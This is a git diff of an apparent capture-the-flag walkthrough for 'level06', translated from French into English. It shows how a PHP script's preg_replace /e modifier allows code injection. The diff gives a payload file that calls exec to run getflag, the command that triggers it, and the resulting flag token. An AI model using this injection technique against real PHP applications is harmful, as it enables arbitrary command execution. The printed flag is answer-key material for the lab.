@@ -1,11 +1,12 @@
-deux fichiers dans le home:
-	- un fichier php
-	- le code php "compile"
+Two files in the /home
+	- One php script
+	- The same script, but *compiled*
 
-le deuxieme argument ne sert a rien a priori
+Of note, despite the script wanting two arguments, the second one is completely useless.
 
 ------------------------
 
+The script makes extensive use of regex, and uses this pattern modifier: "\e":
 https://regex101.com/
 
 https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
@@ -15,20 +16,18 @@ https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php
 	If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences. 
 
 -----
+There is a security warning in the documentation, explaining how this can be used by a third party to execute arbitrary code.
+We can use therefore use this to call the "exec" command, which can be used to execute shell code 
 
-Le \e permet d'executer du code. On va donc utiliser la fonction exec pour lancer une commande.
+In a file (i.e. /tmp/a), we put
 
-Le script n'utilise pas le deuxieme argument on va donc s'en servir pour lancer la commande getflag
+[x .<h1>{${exec(getflag)}}</h1>]
 
-fichier:
+And then
+./level06 /tmp/a
 
-[x .<h1>{${exec($z)}}</h1>]
+We get:
 
-pour le lancer:
-
-./level06 /tmp/a "getflag"
-
-retour:
-
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
  x <h1></h1>
